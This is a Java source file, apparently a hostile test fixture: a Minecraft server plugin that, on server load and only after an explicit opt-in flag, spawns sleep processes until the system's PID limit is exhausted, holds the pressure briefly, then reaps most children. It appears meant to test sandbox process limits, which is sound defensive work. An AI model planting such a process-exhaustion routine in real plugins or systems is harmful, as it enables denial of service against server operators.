package dev.provenance.fixtures.hostile;

import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.List;
import java.util.Locale;
import java.util.Objects;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.TimeUnit;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.server.ServerLoadEvent;
import org.bukkit.plugin.java.JavaPlugin;

public final class ForkPidBombPlugin extends JavaPlugin implements Listener {
  static final String HOSTILE_OPT_IN = "provenance.fixture.hostile.enabled";

  private final Runnable registerServerLoadListener;
  private final ForkPidBombAttack attack;

  public ForkPidBombPlugin() {
    this.attack =
        new ForkPidBombAttack(SleeperProcess::start, SleeperPressureHold::sustain);
    this.registerServerLoadListener =
        () -> getServer().getPluginManager().registerEvents(this, this);
  }

  ForkPidBombPlugin(Runnable registerServerLoadListener, ForkPidBombAttack.ChildStarter starter) {
    this.registerServerLoadListener = Objects.requireNonNull(registerServerLoadListener);
    this.attack = new ForkPidBombAttack(starter, () -> {});
  }

  @Override
  public void onEnable() {
    requireOptIn();
    registerServerLoadListener.run();
  }

  @EventHandler(priority = EventPriority.MONITOR)
  public void onServerLoad(ServerLoadEvent ignored) {
    attack.startOnce();
  }

  private static void requireOptIn() {
    if (!Boolean.getBoolean("provenance.fixture.hostile.enabled")) {
      throw new IllegalStateException("hostile fixture execution requires explicit opt-in");
    }
  }
}

final class ForkPidBombAttack {
  private static final long REAP_TIMEOUT_SECONDS = 1;

  private final ChildStarter childStarter;
  private final PressureSustainer pressureSustainer;
  private final AtomicBoolean triggered = new AtomicBoolean();
  private final List<Process> retainedChildren = new ArrayList<>();

  ForkPidBombAttack(ChildStarter childStarter, PressureSustainer pressureSustainer) {
    this.childStarter = Objects.requireNonNull(childStarter);
    this.pressureSustainer = Objects.requireNonNull(pressureSustainer);
  }

  int startOnce() {
    if (!triggered.compareAndSet(false, true)) {
      return retainedChildren.size();
    }

    while (true) {
      try {
        retainedChildren.add(Objects.requireNonNull(childStarter.start()));
      } catch (IOException exception) {
        if (!isPidLimitDenial(exception)) {
          throw cleanupAfterFailure(
              new IllegalStateException("fork/PID fixture process creation failed", exception));
        }
        return sustainPressureAndRelease();
      } catch (RuntimeException exception) {
        throw cleanupAfterFailure(exception);
      } catch (Error error) {
        throw cleanupAfterFailure(error);
      }
    }
  }

  int retainedChildCount() {
    return retainedChildren.size();
  }

  boolean owns(Process child) {
    return retainedChildren.contains(child);
  }

  private int sustainPressureAndRelease() {
    try {
      pressureSustainer.sustain();
    } catch (InterruptedException exception) {
      Thread.currentThread().interrupt();
      throw cleanupAfterFailure(
          new IllegalStateException("fork/PID pressure hold was interrupted", exception));
    } catch (RuntimeException exception) {
      throw cleanupAfterFailure(exception);
    } catch (Error error) {
      throw cleanupAfterFailure(error);
    }

    try {
      releaseAllButOne();
      return retainedChildren.size();
    } catch (RuntimeException exception) {
      throw cleanupAfterFailure(exception);
    } catch (Error error) {
      throw cleanupAfterFailure(error);
    }
  }

  private void releaseAllButOne() {
    Process survivor = null;
    for (Process child : retainedChildren) {
      if (survivor == null && child.isAlive()) {
        survivor = child;
        continue;
      }
      terminateAndReap(child);
    }
    if (survivor == null) {
      throw new IllegalStateException("fork/PID fixture did not retain a live sleeper");
    }
    retainedChildren.clear();
    retainedChildren.add(survivor);
  }

  private <T extends Throwable> T cleanupAfterFailure(T failure) {
    for (Process child : retainedChildren) {
      try {
        terminateAndReap(child);
      } catch (Throwable cleanupFailure) {
        if (cleanupFailure != failure) {
          failure.addSuppressed(cleanupFailure);
        }
      }
    }
    for (int index = retainedChildren.size() - 1; index >= 0; index--) {
      if (!retainedChildren.get(index).isAlive()) {
        retainedChildren.remove(index);
      }
    }
    return failure;
  }

  private static void terminateAndReap(Process child) {
    boolean interrupted = false;
    boolean reaped = false;
    child.destroy();
    try {
      for (int attempt = 0; attempt < 2 && !reaped; attempt++) {
        try {
          reaped = child.waitFor(REAP_TIMEOUT_SECONDS, TimeUnit.SECONDS);
          if (!reaped) {
            child.destroyForcibly();
          }
        } catch (InterruptedException exception) {
          interrupted = true;
          child.destroyForcibly();
        }
      }
      if (!reaped || child.isAlive()) {
        throw new IllegalStateException("fork/PID fixture could not reap a sleeper");
      }
    } finally {
      if (interrupted) {
        Thread.currentThread().interrupt();
      }
    }
  }

  static boolean isPidLimitDenial(IOException exception) {
    for (Throwable cause = exception; cause != null; cause = cause.getCause()) {
      String message = cause.getMessage();
      if (message == null) {
        continue;
      }
      String normalized = message.toLowerCase(Locale.ROOT);
      // Linux reports pids.max exhaustion as EAGAIN. gVisor can surface the same
      // process-launch denial as ENOMEM. Match only stable ProcessBuilder/errno tokens;
      // strerror text after the comma is locale-dependent.
      if (normalized.contains("cannot run program")
          && (normalized.contains(": error=11,") || normalized.contains(": error=12,"))) {
        return true;
      }
    }
    return false;
  }

  @FunctionalInterface
  interface ChildStarter {
    Process start() throws IOException;
  }

  @FunctionalInterface
  interface PressureSustainer {
    void sustain() throws InterruptedException;
  }
}

final class SleeperPressureHold {
  static final long HOLD_MILLIS = 2_000;

  private SleeperPressureHold() {}

  static void sustain() throws InterruptedException {
    Thread.sleep(HOLD_MILLIS);
  }
}

final class SleeperProcess {
  private static final List<Path> ALLOWED_EXECUTABLES =
      List.of(Path.of("/usr/bin/sleep"), Path.of("/bin/sleep"));
  private static final String SLEEP_SECONDS = "2147483647";

  private SleeperProcess() {}

  static Process start() throws IOException {
    ProcessBuilder builder = new ProcessBuilder(command());
    builder.environment().clear();
    builder.directory(new File(File.separator));
    builder.redirectInput(ProcessBuilder.Redirect.from(new File("/dev/null")));
    builder.redirectOutput(ProcessBuilder.Redirect.DISCARD);
    builder.redirectError(ProcessBuilder.Redirect.DISCARD);
    return builder.start();
  }

  static List<String> command() throws IOException {
    return List.of(resolveExecutable().toString(), SLEEP_SECONDS);
  }

  static Path resolveExecutable() throws IOException {
    for (Path candidate : ALLOWED_EXECUTABLES) {
      if (candidate.isAbsolute()
          && Files.isRegularFile(candidate)
          && Files.isExecutable(candidate)) {
        return candidate;
      }
    }
    throw new IOException("no allowlisted sleeper executable is available");
  }
}
